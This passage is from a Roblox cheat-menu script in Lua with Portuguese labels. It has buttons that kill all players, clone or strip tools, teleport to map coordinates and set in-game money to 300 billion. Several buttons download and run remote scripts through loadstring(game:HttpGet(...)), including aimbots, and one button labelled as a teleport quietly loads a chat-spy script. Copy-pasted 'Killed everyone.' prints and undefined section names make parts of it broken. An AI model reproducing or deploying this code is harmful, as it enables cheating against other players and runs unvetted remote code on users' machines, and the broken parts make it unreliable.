            for i, v in pairs(game:GetService('Players').LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Teams')
                end
            end
            for i, v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Teams')
                end
            end
        end)
    end,
})

arSection:Button({
    Name = "PUXAR ARMAS(OPÇÃO 2)",
    Callback = function()
        print("Killed everyone.")
        local function ClonarTool(tool, player)
            local backpack = player:WaitForChild("Backpack")
            local clonedTool = tool:Clone()
            clonedTool.Parent = backpack
        end

        local function procurarTools()
            local player = game.Players.LocalPlayer

            for _, tool in pairs(game:GetDescendants()) do
                if tool:IsA("Tool") then
                    ClonarTool(tool, player)
                end
            end
        end

        procurarTools()
    end,
})

arSection:Button({
    Name = "KILL ALL",
    Callback = function()
        print("Killed everyone.")
        --- script 
        _G.Stop = false

        repeat game:GetService("RunService").RenderStepped:Wait()
        for _,v in next, game:GetService("Players"):GetPlayers() do
        if v ~= game:GetService("Players").LocalPlayer then
        local char = v.Character or workspace:FindFirstChild(v.Name)
        if char then
        pcall(function()
        char.Head.Anchored = true
        char.Head.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,2,-2.5)
        end)
        end
        end
        end
        until _G.Stop


Window:Notify({
    Title = "PARA TELEPORTA APERTE Z!!!!",
    Description = "EDEXMENU!!",
    Lifetime = 5
})

    end,
})

arSection:Button({
    Name = "KILL ALL(V2 EM DEV)",
    Callback = function()
        print("Killed everyone.")
        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character:BreakJoints() -- Remove todas as juntas, "matando" o personagem
            end
        end        
    end,
})


aimSection:Button({
    Name = "AIMBOT(V1 PC)",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/new-gugus/aimbot-neptune/refs/heads/main/aimbot.lua", true))()
    end,
})

aimSection:Button({
    Name = "AIMBOT(V2 PC)",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Main.lua'),true))()
    end,
})

aimSection:Button({
    Name = "AIMBOT(MOBILE)",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pedroxz63/PedroxzAIMBOT/main/README.md", true))()     
    end,
})




--///////////////////////MINI CITY/////////////////////


local miniSection = miniTab:Section({
    Side = "Left" 
})

local mini2Section = miniTab:Section({
    Side = "Right" 
})


miniSection:Button({
    Name = "TELEPORTA GARAGEM  PROXIMA",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
local player = Players.LocalPlayer

if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
    local hrp = player.Character.HumanoidRootPart

    -- Coordenadas fornecidas
    local coord1 = Vector3.new(-465.3, 4.8, 353.9)
    local coord2 = Vector3.new(-1344.5, 29.9, -970.0)

    -- Posição atual do jogador
    local playerPos = hrp.Position

    -- Calcula a distância
    local distance1 = (playerPos - coord1).Magnitude
    local distance2 = (playerPos - coord2).Magnitude

    -- Teleporta para a coordenada mais próxima
    if distance1 < distance2 then
        hrp.CFrame = CFrame.new(coord1)
    else
        hrp.CFrame = CFrame.new(coord2)
    end
end  
    end,
})



 miniSection:Button({
     Name = "TELEPORTA FAVELA",
     Callback = function()
     print("Teleportando...")

                local Players = game:GetService("Players")
                local player = Players.LocalPlayer

                if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = player.Character.HumanoidRootPart

                    -- Coordenadas de destino (corrija se necessário)
                    local coord1 = Vector3.new(-1184.8, 76.9, -370.2)
                    local coord2 = Vector3.new(-1184.8, 76.9, -370.2) -- Defina uma segunda coordenada válida

                    -- Posição atual do jogador
                    local playerPos = hrp.Position

                    -- Calcula a distância para ambas as coordenadas
                    local distance1 = (playerPos - coord1).Magnitude
                    local distance2 = (playerPos - coord2).Magnitude

                    -- Teleporta para a coordenada mais próxima
                    if distance1 < distance2 then
                        hrp.CFrame = CFrame.new(coord1)
                    else
                        hrp.CFrame = CFrame.new(coord2)
                    end
                else
                    print("Erro: Jogador ou HumanoidRootPart não encontrado!")
                end


    end,
})

miniSection:Button({
    Name = "TELEPORTA PRAÇA",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
                local player = Players.LocalPlayer

                if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = player.Character.HumanoidRootPart

                    -- Coordenadas de destino (corrija se necessário)
                    local coord1 = Vector3.new(-224.9, 3.9, 393.5)
                    local coord2 = Vector3.new(-224.9, 3.9, 393.5) -- Defina uma segunda coordenada válida

                    -- Posição atual do jogador
                    local playerPos = hrp.Position

                    -- Calcula a distância para ambas as coordenadas
                    local distance1 = (playerPos - coord1).Magnitude
                    local distance2 = (playerPos - coord2).Magnitude

                    -- Teleporta para a coordenada mais próxima
                    if distance1 < distance2 then
                        hrp.CFrame = CFrame.new(coord1)
                    else
                        hrp.CFrame = CFrame.new(coord2)
                    end
                else
                    print("Erro: Jogador ou HumanoidRootPart não encontrado!")
                end

    end,
})



miniSection:Button({
    Name = "TELEPORTA JOGADOR MORTO PROXIMO",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

function findClosestDeadPlayer()
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and not player.Character:FindFirstChild("Humanoid") then
            local distance = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character:GetPivot().Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestPlayer = player
            end
        end
    end
    return closestPlayer
end

function teleportToDeadPlayer()
    local deadPlayer = findClosestDeadPlayer()
    if deadPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character:MoveTo(deadPlayer.Character:GetPivot().Position)
    end
end

-- Exemplo: Chamar a função quando a tecla "T" for pressionada
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.T and not gameProcessed then
        teleportToDeadPlayer()
    end
end)

    end,
})







--///////////////////////CIDADE ALTA/////////////////////


local cdaSection = cdaTab:Section({
    Side = "Left" 
})

local cda2Section = cdaTab:Section({
    Side = "Right" 
})

cdaSection:Button({
    Name = "TELEPORTA PRAÇA",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer

        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart

            -- Coordenadas de destino (corrija se necessário)
            local coord1 = Vector3.new(-1184.8, 76.9, -370.2)
            local coord2 = Vector3.new(-1184.8, 76.9, -370.2) -- Defina uma segunda coordenada válida

            -- Posição atual do jogador
            local playerPos = hrp.Position

            -- Calcula a distância para ambas as coordenadas
            local distance1 = (playerPos - coord1).Magnitude
            local distance2 = (playerPos - coord2).Magnitude

            -- Teleporta para a coordenada mais próxima
            if distance1 < distance2 then
                hrp.CFrame = CFrame.new(coord1)
            else
                hrp.CFrame = CFrame.new(coord2)
            end
        else
            print("Erro: Jogador ou HumanoidRootPart não encontrado!")
        end

    end,
})


cdaSection:Button({
    Name = "TELEPORTA FAVELA PROXIMA",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
                local player = Players.LocalPlayer

                if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = player.Character.HumanoidRootPart

                    -- Coordenadas de destino (corrija se necessário)
                    local coord1 = Vector3.new(-1184.8, 76.9, -370.2)
                    local coord2 = Vector3.new(-1184.8, 76.9, -370.2) -- Defina uma segunda coordenada válida

                    -- Posição atual do jogador
                    local playerPos = hrp.Position

                    -- Calcula a distância para ambas as coordenadas
                    local distance1 = (playerPos - coord1).Magnitude
                    local distance2 = (playerPos - coord2).Magnitude

                    -- Teleporta para a coordenada mais próxima
                    if distance1 < distance2 then
                        hrp.CFrame = CFrame.new(coord1)
                    else
                        hrp.CFrame = CFrame.new(coord2)
                    end
                else
                    print("Erro: Jogador ou HumanoidRootPart não encontrado!")
                end

    end,
})

cdaSection:Button({
    Name = "TELEPORTA JOGADOR MORTO PROXIMO",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Chat-spy-3000"))()     
    end,
})




cda1Section:Button({
    Name = "PUXAR DINHEIRO",
    Callback = function()
        print("Killed everyone.")
        local Player = game.Players.LocalPlayer
local Dinheiro = Player.leaderstats.Dinheiro

Dinheiro.Value = 300000000000
    end,
})











--/////////////////////////////BYPASS/////////////////////

local by1Section = BypassTab:Section({
    Side = "Left" 
})

local by2Section = bypassTab:Section({
    Side = "Right" 
})
